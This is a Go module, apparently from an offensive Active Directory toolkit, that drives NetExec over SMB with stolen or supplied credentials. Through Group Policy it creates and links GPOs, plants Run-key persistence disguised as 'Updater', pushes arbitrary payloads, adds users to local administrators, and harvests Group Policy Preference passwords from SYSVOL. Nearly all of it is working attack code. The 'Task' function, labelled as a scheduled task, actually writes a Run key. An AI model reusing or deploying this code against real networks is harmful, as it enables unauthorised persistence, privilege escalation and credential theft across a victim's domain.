package modules

import (
	"adpack/utils"
	"fmt"
)

type GPOManager struct{}

func (g *GPOManager) Create(name, ou, target, user, pass, domain string) error {
	utils.Step(fmt.Sprintf("Creating GPO '%s' linked to %s...", name, ou))
	psCmd := fmt.Sprintf("New-GPO -Name '%s' | New-GPLink -Target '%s'", utils.SanitizeFlag(name), utils.SanitizeFlag(ou))
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain,
		"-x", utils.PowerShellCmd(psCmd))
	if !result.Success {
		return fmt.Errorf("GPO create failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (g *GPOManager) RunKey(name, cmd, target, user, pass, domain string) error {
	utils.Step(fmt.Sprintf("Adding RunKey to GPO '%s'...", name))
	psCmd := fmt.Sprintf("Set-GPRegistryValue -Name '%s' -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Updater' -Value '%s' -Type String", utils.SanitizeFlag(name), utils.SanitizeFlag(cmd))
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain,
		"-x", utils.PowerShellCmd(psCmd))
	if !result.Success {
		return fmt.Errorf("GPO RunKey failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (g *GPOManager) Task(name, payload, target, user, pass, domain string) error {
	utils.Step(fmt.Sprintf("Adding scheduled task to GPO '%s'...", name))
	psCmd := fmt.Sprintf("Set-GPPrefRegistryValue -Name '%s' -Context Computer -Action Create -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Task' -Value '%s' -Type String", utils.SanitizeFlag(name), utils.SanitizeFlag(payload))
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain,
		"-x", utils.PowerShellCmd(psCmd))
	if !result.Success {
		return fmt.Errorf("GPO task failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (g *GPOManager) LocalAdmin(name, targetUser, target, user, pass, domain string) error {
	utils.Step(fmt.Sprintf("Adding %s to local admins via GPO '%s'...", targetUser, name))
	psCmd := fmt.Sprintf("Set-GPPrefRegistryValue -Name '%s' -Context Computer -Action Create -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Admin' -Value 'net localgroup administrators %s /add' -Type String", utils.SanitizeFlag(name), utils.SanitizeFlag(targetUser))
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain,
		"-x", utils.PowerShellCmd(psCmd))
	if !result.Success {
		return fmt.Errorf("GPO localadmin failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (g *GPOManager) Find(target, user, pass, domain string) error {
	utils.Step("Searching SYSVOL for GPP passwords...")
	result := utils.RunCommand("nxc", "smb", target, "-u", user, "-p", pass, "-d", domain, "-M", "gpp_password")
	if !result.Success {
		return fmt.Errorf("GPP search failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}
